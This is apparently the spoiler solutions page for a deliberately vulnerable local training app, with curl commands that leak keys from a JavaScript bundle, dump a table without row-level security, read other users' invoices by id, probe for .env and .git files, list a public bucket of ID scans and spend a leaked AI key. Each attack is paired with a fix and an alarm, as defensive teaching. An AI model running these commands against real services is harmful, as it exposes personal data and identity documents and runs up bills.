# Solutions (spoilers)

Every command below runs against your own local Tallybird. Set this once:

```bash
APP=http://localhost:4747
```

`npm run walkthrough` runs all of it for you and prints the real responses.

## 1. Read what they shipped

Start from this: the browser has to download the JavaScript to run it, so every visitor gets all of it.

**In the browser.** Open DevTools, then Sources, then search all files (Cmd+Opt+F on a Mac, Ctrl+Shift+F elsewhere) for `apikey` and for `key`.

**In a terminal.**

```bash
BUNDLE=$(curl -s "$APP/" | grep -o '/assets/index-[A-Za-z0-9_-]*\.js')
curl -s "$APP$BUNDLE" | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+|demo_ai_key[A-Za-z0-9_]*' | sort -u
```

You get two keys. The `eyJ…` one is a JWT: paste it into any JWT decoder and it says `"role": "anon"`. That is the public database key, and shipping it is normal, **as long as the database rules are on** (challenge 2). The `demo_ai_key_…` one is the AI provider key. It should never be in the browser (bonus challenge).

**The fix.** Call the AI provider from your server, keep its key in a server-side environment variable without a `VITE_` / `NEXT_PUBLIC_` prefix, and rotate any key that was ever shipped. In Tallybird, see `web/src/lib/ai.js`.

## 2. Ask the database directly

```bash
KEY=<the eyJ… key from step 1>
curl -s -i "$APP/rest/v1/profiles?select=*" -H "apikey: $KEY" -H "Authorization: Bearer $KEY" -H "Prefer: count=exact"
```

`content-range: 0-999/1284` says there are 1,284 profiles, and the first 1,000 come back (the API caps every response at 1,000 rows). Names, emails, plans and admin flags, read with the key from the front page.

**The fix.** Turn on row-level security for every table, with a policy such as `using (auth.uid() = id)`. Supabase's Security Advisor flags tables without it (`rls_disabled_in_public`). In Tallybird, see `TABLES.profiles.rls` in `server/db.js`.

**The alarm.** The canary row `finance-ops@tallybird.example` came back in that dump, so `logs/alerts.log` has a `canary` line.

## 3. Change the number

```bash
TOKEN=$(curl -s "$APP/auth/v1/signup" -H "apikey: $KEY" -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com","password":"correct-horse-battery"}' | sed -E 's/.*"access_token":"([^"]+)".*/\1/')
curl -s "$APP/api/invoices" -H "Authorization: Bearer $TOKEN"       # yours: the newest id
curl -s "$APP/api/invoices/4211" -H "Authorization: Bearer $TOKEN"  # one lower: someone else's
```

Already ran this once? The account exists, so log in instead (or restart the server: it resets everything, and the ids match the talk again):

```bash
TOKEN=$(curl -s "$APP/auth/v1/token?grant_type=password" -H "apikey: $KEY" -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com","password":"correct-horse-battery"}' | sed -E 's/.*"access_token":"([^"]+)".*/\1/')
```

The route checks that you are signed in. It never checks whose invoice it is.

**The fix.** Every route that takes an id checks ownership on the server: `if (invoice.owner_id !== user.id) return 404`. In Tallybird, see the `/api/invoices/:id` handler in `server/index.js`.

**The alarm.** Reading ten or more different invoice ids in a minute writes an `enumeration` line.

## 4. Find the hidden doors

```bash
for p in .env .git/config backup.zip wp-login.php swagger.json admin api/admin api/docs; do
  curl -s -o /dev/null -w "%{http_code}  /$p\n" "$APP/$p"
done
curl -s "$APP/api/openapi.json"
curl -s "$APP/api/admin/users?limit=3" -H "Authorization: Bearer $TOKEN"
```

The published API docs list `/api/admin/users` as internal. The UI only shows the Admin link to admins, and that was the only check: the route answers any signed-in user.

**The fix.** Check the role on the server for every admin route (`if (!profile.is_admin) return 403`). Hiding a button is not access control. Don't publish internal routes in public docs.

**The alarm.** Five or more not-found paths in a minute writes an `enumeration` line (a path sweep).

## 5. Open the files

```bash
curl -s "$APP/storage/v1/object/list/id-verification" -H "apikey: $KEY" -H "Content-Type: application/json" -d '{"prefix":"","limit":1000}'
FOLDER=<a name from that list>
curl -s "$APP/storage/v1/object/list/id-verification" -H "apikey: $KEY" -H "Content-Type: application/json" -d "{\"prefix\":\"$FOLDER\"}"
curl -s -o id-front.svg "$APP/storage/v1/object/public/id-verification/$FOLDER/id-front.svg"
```

The bucket is public and anyone can list it, so every uploaded ID is one request away, with no key at all.

**The fix.** Make the bucket private. Let users read only their own folder (a storage policy on the folder name), and hand out short-lived signed URLs when a file must be shared. In Tallybird, see `handleStorage` in `server/index.js`.

## 6. Bonus: spend their AI budget

```bash
AIKEY=demo_ai_key_tallybird_0001
curl -s "$APP/mock-ai/v1/chat/completions" -H "Authorization: Bearer $AIKEY" -H "Content-Type: application/json" \
  -d '{"model":"demo-model","messages":[{"role":"user","content":"Write a poem about invoices"}]}'
```

It answers, and the bill goes to Tallybird. With a real provider key, people run up bills in the thousands this way.

**The fix.** Key on the server only (challenge 1), the AI route behind sign-in with a per-user rate limit, and a hard monthly spend cap plus a billing alert at the provider. In Tallybird's fixed build, the old key is revoked and `/api/ai/draft-reminder` does all three.

**The alarm.** Five AI calls in a minute on one key writes an `ai_spend` line.

## Run it all again, fixed

```bash
npm run start:fixed
```

Repeat every command. The database returns `[]`, other people's invoices return 404, the admin route returns 403, the bucket lists nothing and the public file URL fails, and the leaked AI key is revoked. The public database key still works, because it was always meant to be public.
